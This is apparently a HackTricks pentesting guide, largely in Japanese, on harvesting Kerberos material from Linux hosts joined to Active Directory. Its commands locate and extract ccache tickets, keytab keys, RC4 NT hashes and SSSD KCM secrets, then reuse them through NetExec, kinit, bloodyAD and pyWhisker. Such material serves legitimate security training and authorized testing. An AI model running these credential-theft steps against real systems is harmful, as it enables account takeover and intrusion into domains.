# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux machineもActive Directory環境内に存在する場合があります。

AD内のLinux machineは、**Kerberos materialをローカルに保存**することがあります。これには、user ccache、machine/service keytab、SSSDが管理するsecretが含まれます。これらのartefactは通常、他のKerberos credentialと同様に再利用できます。これらの大部分を読み取るには、ticketのuser ownerまたはmachine上の**root**である必要があります。

## Enumeration

### LinuxからのAD enumeration

Linux上のAD（またはWindowsのbash）へのaccessがある場合、[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)を使用してADをenumerateできます。

以下のページで、**LinuxからADをenumerateするその他の方法**も確認できます。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPAは、主に**Unix**環境向けのMicrosoft Windows **Active Directory**のopen-source **alternative**です。完全な**LDAP directory**とMIT **Kerberos** Key Distribution Centerを組み合わせ、Active Directoryに類似したmanagementを実現します。Dogtag **Certificate System**をCAおよびRA certificate managementに利用し、smartcardを含む**multi-factor** authenticationをサポートします。SSSDはUnix authentication process向けに統合されています。詳細については、以下を参照してください。


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

ticketを扱う前に、**hostがADにどのようにjoinされたか**、および**Kerberos materialが実際にどこに保存されているか**を特定します。modern Linux hostでは、これは通常、`realmd` + `adcli` + `sssd`によって処理され、単に`/tmp`内のflat fileだけで処理されるわけではありません。
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
これは、host が AD を信頼しているか、SSSD が identities または tickets を cache しているか、さらに **machine/service keytabs** または **KCM secrets** が abuse に利用可能かをすばやく確認できます。

## Playing with tickets

### Pass The Ticket

このページでは、**Linux host 内で kerberos tickets を見つけられる場所**を確認できます。以下のページでは、これらの CCache tickets formats を Kirbi（Windows で使用する必要がある format）に変換する方法と、PTT attack の実行方法を学べます。


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` など）については、専用ページを確認してください：

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files は **Kerberos credentials を保存する**ための binary formats です。`FILE:/tmp/krb5cc_%{uid}` は現在も一般的ですが、modern Linux deployments では `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}`、または `KCM:%{uid}` も使用されます。tickets が `/tmp` に存在すると想定する前に、**`KRB5CCNAME`** environment variable と `default_ccache_name` setting を確認してください。<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyringからのCCACHE ticket reuse

**プロセスのメモリに保存されたKerberos ticketsはextractできます**。特に、マシンのptrace protection（`/proc/sys/kernel/yama/ptrace_scope`）がdisabledの場合に可能です。この目的に役立つtoolは[https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)にあり、sessionsにinjectしてticketsを`/tmp`にdumpすることでextractを容易にします。

このtoolをconfigureして使用するには、以下の手順に従います：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
この手順では、さまざまなセッションへの inject を試行し、`__krb_UID.ccache` という命名規則で抽出した ticket を `/tmp` に保存することで成功を示します。<sup>[[1]](#references)</sup>

### SSSD KCM からの CCACHE ticket の再利用

SSSD はデータベースのコピーを `/var/lib/sss/secrets/secrets.ldb` に保持しています。対応する key は、`/var/lib/sss/secrets/.secrets.mkey` に hidden file として保存されています。デフォルトでは、key は **root** permissions がある場合にのみ読み取り可能です。

**`SSSDKCMExtractor`** を --database および --key parameters とともに実行すると、データベースを parse して **secrets を decrypt** します。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob は、Mimikatz/Rubeus に渡せる使用可能な Kerberos CCache ファイルに変換できます。**

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab からアカウントを抽出

root 権限で動作するサービスに不可欠なサービスアカウントのキーは、**`/etc/krb5.keytab`** ファイルに安全に保存されています。サービスのパスワードに相当するこれらのキーは、厳重に機密として扱う必要があります。

keytab ファイルの内容を調査するには、**`klist`** を使用できます。Linux では、`klist -k -K -e` により、principal、キー バージョン番号、暗号化タイプ、生のキー マテリアルが表示されます。キータイプが **23 / RC4-HMAC** の場合、キー値はその principal の **NT hash** でもあります。
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linuxユーザー向けに、**`KeyTabExtract`** はRC4 HMAC hashをextractする機能を提供し、NTLM hash reuseに利用できます。ただし、これはkeytabに**etype 23 / RC4-HMAC**のmaterialがまだ含まれている場合にのみ有効です。**AES-only**環境では再利用可能なNT hashを取得できない場合がありますが、Kerberos経由でkeytabを使用して直接authenticateすることはできます。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOSでは、**`bifrost`** はkeytabファイルの分析用ツールとして機能します。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
抽出したアカウントおよび hash 情報を利用して、**`NetExec`** などのツールでサーバーへの接続を確立できます。
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` の machine account を再利用する

`realmd`/`adcli`/`sssd` で join されたシステムでは、`/etc/krb5.keytab` に通常、**コンピューターアカウント**と 1 つ以上の **host/service principals** が含まれています。**root** 権限がある場合、単に dump するのではなく、`klist -k` で表示される principals のいずれかを使用して TGT を要求し、Linux host 自体として操作します。
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
これは、**computer object** 自体に AD で委任された権限がある場合や、そのホストが **gMSA** などの他の secrets の取得を許可されている場合に特に役立ちます。

### Linux-first AD tooling で盗んだ Kerberos マテリアルを再利用する

有効な `ccache` または使用可能な keytab を取得すると、すべてを先に Windows 形式へ変換することなく、**Linux から直接** AD に対して操作できます。多くの最新のツールは `KRB5CCNAME` / Kerberos auth をネイティブに受け付けます：
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
これは **Linux post-exploitation** と **AD object abuse** の間をつなぐ良い内容です。object-level abuse の手法自体については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account の artefacts

最近の Linux 環境では、AD から **Managed Service Accounts** を直接利用できます。実際には、Linux サーバーを compromise した後、ホストの keytab だけでなく、gMSA から生成された **service-specific keytabs** も見つかる可能性があります。確認すべき一般的な場所は `/etc/gmsad.conf`、deployment 固有の config files、および `/etc` 配下の追加の `*.keytab` files です。<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
これは、**Windows endpoint に一切触れることなく**、その gMSA に紐付けられた SPN 用の再利用可能な Kerberos identity を提供します。AD でより高い権限を取得した後の **domain-side** gMSA/dMSA abuse については、以下を確認してください。

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos を攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [managed service account で AD にアクセスする – RHEL systems を Active Directory と直接統合する](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
